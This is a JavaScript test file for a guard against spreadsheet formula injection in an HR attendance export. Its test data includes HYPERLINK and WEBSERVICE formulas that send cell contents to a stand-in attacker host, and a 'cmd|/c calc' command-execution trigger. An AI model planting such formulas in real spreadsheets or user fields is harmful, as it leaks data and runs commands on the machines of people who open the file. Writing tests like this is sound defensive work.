/**
 * ──────────────────────────────────────────────────────────
 * Integration Tests — Excel formula-injection guard (SEC-004)
 * ──────────────────────────────────────────────────────────
 * Spreadsheet apps (Excel / LibreOffice) evaluate cells whose value
 * starts with `= + - @ \t \r` as formulas. A user-controlled string
 * like `=HYPERLINK("http://attacker.tld/?u="&A2,"Click")` becomes
 * an outbound-call+exfil vector when an HR admin opens the export.
 *
 * The exportService now passes every user-controlled string through
 * safeCell(), which prepends `'` to neutralise the formula trigger.
 *
 * These tests:
 *   1. Unit-test safeCell() directly (purest signal).
 *   2. Integration-test the actual generateExcel + generateEvaluationExcel
 *      pipelines by seeding a participant whose name is a formula and
 *      reading back the generated workbook with exceljs.
 */

const ExcelJS = require('exceljs');
const mongoose = require('mongoose');
const { getApp, getSeedData } = require('../setup');

let app, seed;

beforeAll(async () => {
  app = await getApp();
  seed = getSeedData();
});

afterAll(async () => {
  await mongoose.disconnect();
});

// ── 1. Unit: safeCell() pure function ───────────────────────

describe('safeCell() (SEC-004 helper)', () => {
  const { safeCell } = require('../../services/exportService');

  test('prepends apostrophe when string starts with =', () => {
    expect(safeCell('=1+1')).toBe("'=1+1");
  });
  test('prepends apostrophe when string starts with +', () => {
    expect(safeCell('+evil')).toBe("'+evil");
  });
  test('prepends apostrophe when string starts with -', () => {
    expect(safeCell('-cmd|/c calc')).toBe("'-cmd|/c calc");
  });
  test('prepends apostrophe when string starts with @', () => {
    expect(safeCell('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)");
  });
  test('prepends apostrophe when string starts with tab', () => {
    expect(safeCell('\t=1')).toBe("'\t=1");
  });
  test('prepends apostrophe when string starts with carriage return', () => {
    expect(safeCell('\r=1')).toBe("'\r=1");
  });
  test('handles HYPERLINK exfil payload', () => {
    const evil = '=HYPERLINK("http://attacker.tld/?u="&A2,"Click")';
    expect(safeCell(evil)).toBe(`'${evil}`);
  });
  test('handles WEBSERVICE exfil payload', () => {
    const evil = '=WEBSERVICE("http://attacker.tld/leak?d="&CELL("contents",A1))';
    expect(safeCell(evil)).toBe(`'${evil}`);
  });
  test('passes through normal text unchanged', () => {
    expect(safeCell('Nguyen Van A')).toBe('Nguyen Van A');
    expect(safeCell('Marketing')).toBe('Marketing');
    expect(safeCell('Foundation B1')).toBe('Foundation B1');
  });
  test('passes through empty string unchanged', () => {
    expect(safeCell('')).toBe('');
  });
  test('passes through numbers unchanged (no transform)', () => {
    expect(safeCell(0)).toBe(0);
    expect(safeCell(42)).toBe(42);
    expect(safeCell(3.14)).toBe(3.14);
  });
  test('passes through null/undefined unchanged', () => {
    expect(safeCell(null)).toBe(null);
    expect(safeCell(undefined)).toBe(undefined);
  });
  test('passes through Date unchanged', () => {
    const d = new Date('2026-01-15');
    expect(safeCell(d)).toBe(d);
  });
});

// ── 2. Integration: attendance export workbook ──────────────

describe('exportAttendance (SEC-004 generateExcel)', () => {
  test('user.name = "=1+1" is written as literal string in workbook', async () => {
    const User = require('../../models/User');
    const Schedule = require('../../models/Schedule');
    const Attendance = require('../../models/Attendance');
    const { exportAttendance } = require('../../services/exportService');

    // Plant an attacker-controlled name on a fresh user. We override the
    // existing seed user rather than create one to keep the test isolated
    // from FK/Index constraints elsewhere.
    const evilName = '=HYPERLINK("http://attacker.tld/?u="&A2,"Click")';
    await User.findByIdAndUpdate(seed.member2._id, {
      name: evilName,
      department: '+SUM(1,1)',
    });

    // Seed a past schedule + attendance row so the export pipeline has
    // something to emit.
    const past = new Date(Date.now() - 24 * 3600_000);
    const sch = await Schedule.create({
      classId: seed.class1._id,
      bookedTeamId: seed.team._id,
      startTime: past,
      endTime: new Date(past.getTime() + 90 * 60_000),
      enrolledUsers: [seed.member2._id],
    });
    await Attendance.create({
      scheduleId: sch._id,
      userId: seed.member2._id,
      status: 'P',
      // Use `-` prefix to cover the third trigger char in one row.
      remark: '-cmd|/c calc',
      syncStatus: 'PENDING',
    });

    const result = await exportAttendance({ includeExported: false });

    expect(result.recordCount).toBeGreaterThanOrEqual(1);
    expect(Buffer.isBuffer(result.buffer)).toBe(true);

    // Parse the workbook back and walk every cell — every "userName" /
    // "department" / "remark" cell that started with =+-@ must now begin
    // with an apostrophe so Excel treats it as a string literal.
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(result.buffer);
    const sheet = wb.worksheets[0];
    const header = sheet.getRow(1).values; // 1-indexed
    const nameCol = header.indexOf('Họ Tên');
    const deptCol = header.indexOf('Phòng Ban');
    const remarkCol = header.indexOf('Ghi Chú');

    let sawEvilRow = false;
    for (let r = 2; r <= sheet.rowCount; r++) {
      const nameVal = String(sheet.getRow(r).getCell(nameCol).value ?? '');
      if (nameVal.includes('attacker.tld')) {
        sawEvilRow = true;
        // The dangerous prefix must be escaped — value starts with apostrophe.
        expect(nameVal.startsWith("'=")).toBe(true);
        const dept = String(sheet.getRow(r).getCell(deptCol).value ?? '');
        expect(dept.startsWith("'+")).toBe(true);
        const remark = String(sheet.getRow(r).getCell(remarkCol).value ?? '');
        expect(remark.startsWith("'-")).toBe(true);
      }
    }
    expect(sawEvilRow).toBe(true);
  });
});
